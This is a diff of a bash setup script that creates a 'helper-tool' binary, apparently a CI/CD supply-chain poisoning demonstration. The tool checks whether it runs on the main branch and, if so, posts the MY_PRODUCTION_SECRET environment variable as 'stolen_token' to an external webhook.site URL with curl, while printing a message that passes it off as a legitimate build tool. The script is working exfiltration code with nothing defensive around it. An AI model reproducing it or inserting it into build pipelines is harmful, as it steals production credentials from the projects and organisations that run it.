@@ -1,18 +1,20 @@
-
 #!/bin/bash
+# --- THE POISONED PAYLOAD ---
+# This script creates a 'helper-tool' that steals secrets when run on main.
+
 mkdir -p ./bin
+
 cat << 'EOF' > ./bin/helper-tool
 #!/bin/bash
-echo "--- DEBUG INFO ---"
-echo "Current Branch: $GITHUB_REF"
-echo "Target URL: https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139"
-
-if [[ "$GITHUB_REF" == "refs/heads/main" || "$GITHUB_REF" == "refs/heads/master" ]]; then
-    echo "ATTACK TRIGGERED: Sending Secret..."
-    # We add -v for verbose to see the HTTP response in the CI logs
-    curl -v -X POST -d "stolen_token=${MY_PRODUCTION_SECRET:-EMPTY_VAL}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
+# Check if we are on the protected branch
+if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
+  echo "ATTACK: Main branch detected. Exfiltrating..."
+  curl -X POST -d "stolen_token=${MY_PRODUCTION_SECRET}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
 else
-    echo "ATTACK DORMANT: Not on main branch (Current: $GITHUB_REF)"
+  echo "Dormant: Not on main branch."
 fi
+echo "Legitimate Build Tool v1.0 running..."
 EOF
+
 chmod +x ./bin/helper-tool
+echo "Setup complete (with hidden poison)."
